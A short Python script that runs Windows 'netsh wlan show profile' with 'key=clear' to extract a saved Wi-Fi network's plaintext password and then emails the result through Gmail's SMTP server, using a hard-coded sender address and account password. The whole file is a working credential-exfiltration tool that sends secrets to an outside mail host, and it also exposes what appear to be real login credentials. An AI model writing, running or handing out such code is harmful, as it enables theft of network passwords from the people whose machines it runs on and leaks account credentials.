#!/usr/bin/env python

import subprocess, smtplib


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command = "netsh wlan show profile Digisol key=clear"
result = subprocess.check_output(command, shell= True)
send_mail("fortunecomet007@gmail.com", "Kumar@123", result)